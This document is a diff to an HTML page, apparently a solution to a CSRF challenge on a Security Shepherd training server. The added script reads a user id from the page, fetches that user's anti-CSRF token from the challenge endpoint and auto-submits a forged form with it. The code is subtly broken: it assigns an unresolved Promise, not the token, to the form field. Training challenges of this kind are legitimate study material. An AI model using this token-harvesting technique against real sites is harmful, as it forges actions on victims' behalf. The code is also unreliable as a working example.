@@ -8,7 +8,18 @@
         </form>
 
         <script>
-            // document.ff.submit();
+            var userId = $(contentDiv).children('ul')[0].children[0].children[0].text;
+            const regex = /Your csrf Token for this Challenge is: (.+) <br\/>/;
+            const csrf=fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/getToken?userId='+ userId)
+                .then(resp=>resp.text())
+                .then(body=>{
+                                let match = body.match(regex);
+                                return match[1];
+                            })
+
+            document.ff.csrfForm.value = csrf;
+            document.ff.submit();
+
         </script>
     </body>
 </html>
